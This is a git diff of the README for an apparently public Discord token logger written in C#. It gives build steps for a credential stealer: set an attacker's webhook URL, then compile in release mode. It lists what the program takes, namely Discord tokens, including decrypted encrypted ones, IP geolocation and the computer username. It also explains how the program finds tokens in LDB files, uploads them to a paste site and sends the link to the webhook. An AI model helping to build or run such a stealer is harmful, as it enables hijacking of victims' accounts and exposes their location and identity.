@@ -8,74 +8,76 @@
 # Video preview
  ![](https://cdn.discordapp.com/attachments/916391368480415744/916395788312117298/work-preview.gif)
 # Image preview
- ![](https://cdn.discordapp.com/attachments/916391368480415744/918147943121448990/image_preview.png)
+ ![](https://cdn.discordapp.com/attachments/978803508545454170/978803568565964890/Paste_Example.jpg)
 
 # Building the project
- Download the source, open the solution file and head over to the Token.cs class  
-   
- Find the following line  
- ```c#
- public readonly string webHook = string.Empty;
- ```
- Change it so it looks like this
- ```cs
- public readonly string webHook = "your_webhook_link_hoes_here";
- ```
+ Download the source from the Release section, open the solution and head over to the Engine.cs class.  
 
-# What does it grab
- It grabs Discord tokens (normal and mfa), Geolocation and current PC username.
-
-# How it works - **Token** class
- **1.** We declare our regex pattern which will be used to search for tokens in Discord, PTB Discord, Canary Discord and some browser destinations. Instead of using two separated ones I am using one that does the same job.
-
- **2.** Scans the **.ldb** files and searches for a token. If found it is added to a [StringBuilder](https://docs.microsoft.com/en-us/dotnet/api/system.text.stringbuilder?view=net-6.0 "StringBuilder class").
-
- **3.** Normal tokens and tokens with two-factor authentication are separated in different StringBuilders.
-
- **4.** We concatenate all tokens in one variable.
-
- **5.** If uploading to the external site have been successful, we are sending the link to the Discord WebHook.
-
-# How it works - **Paste** class
- **1.** A class where we make a POST and GET request to the external site.
-
- **2.** We make POST request to the site to upload our tokens.
-
- **3.** We wait for GET request to receive information and find our link using regex pattern. Afterwards we save that link in a variable.
-
-# How it works - **Location** class
- **1.** We make a special method only to extract the IP address so we can use it later.
-
- **2.** We deserializate JSON to a Object to get the required information such as continent, country, region, ASN, ISP.
-
-
- JSON to Object deserialization example
- ```c#
- public class Account
- {
-     public string Email { get; set; }
-     public bool Active { get; set; }
-     public DateTime CreatedDate { get; set; }
-     public IList<string> Roles { get; set; }
- }
- ```
+ Change [following line](https://github.com/ihaai/Discord-Token-Logger/blob/b7f49d5c3cdaba7c4fe2f60e794e3fae707c18e4/Logger/TokenLogger/Engine.cs#L22 "WebHook line")  
 
  ```c#
- string json = @"{
-  'Email': 'james@example.com',
-  'Active': true,
-  'CreatedDate': '2013-01-20T00:00:00Z',
-  'Roles': [
-    'User',
-    'Admin'
-  ]
-}";
-
-Account account = JsonConvert.DeserializeObject<Account>(json);
-
-Console.WriteLine(account.Email);
-// Output: james@example.com
+ private string WebHook { get; } = String.Empty;
+ ```
+ To look like this
+ ```c#
+ private string WebHook { get; } = "Your_webhook_link_goes_here";
  ```
 
-# How it works - **Program** class
- **1.** We create a class instance also known as Object so we can access our methods
+ After setting up the webhook, change the build configuration to **release** and build the project, that's all!
+
+# What does the program grab
+ The program grabs the following:
+ * User tokens
+   * Normal tokens
+   * Encrypted tokens
+   * Encrypted tokens are being decrypted
+ * Geolocation
+   * Continent
+   * Continent code
+   * Country
+   * Country code
+   * Country capital
+   * Time zone
+   * Region
+   * ISP
+   * ASN
+   * IP
+ * Computer username
+ * Time, indicating when the paste has been uploaded
+
+# How it works - Engine class
+ This is our main class, used to call the necessary functions in order to extract, decrypt and send user tokens.  
+
+ 1. We declare a public delegate called **FunctionInvoke()** used to store our functions.  
+
+ 2. We declare our Regex patterns, Lists and Dictionaries and initialize them by giving them value in the function **Run()**  
+
+ 3. All private functions are being added to a **List\<T>** of type **FunctionInvoker**.  
+
+ 4. We loop through the **FunctionInvoker List** using **List\<T>.ForEach(Action\<T>)** and each function is getting invoked one by one.  
+
+ 5. We loop through the **Dictionary** containing the path information, getting the LDB file and looking for Regex match. If there's one, we add the found token to the corresponding token list.  
+
+ 6. We decrypt all encrypted tokens and adding them to a separate list.  
+
+ 7. We upload all acquired user information to the paste and finally send it to the webhook.
+
+# How it works - Location class
+ This is the class that gets the geolocation of the user.
+
+ 1. We declare our properties to store the information.  
+
+ 2. We get all information by making a request to an external site which returns data in JSON format. The returned data is being deserialized using [Json.NET - Newtonsoft](https://www.newtonsoft.com/json "Site") and values are being assigned to the properties.
+
+# How it works - Paste class
+ This is the class that uploads the paste.  
+
+ 1. We create GET/POST to the external site.  
+ 
+ 2. We use Regex pattern to search for the paste link that will be sent to the webhook.
+
+# How it works - SetConsoleColor class
+ The class name speaks for itself.
+
+# How it works - Program class
+ This is the class where we create instance to **Engine.cs** so we can call functions.
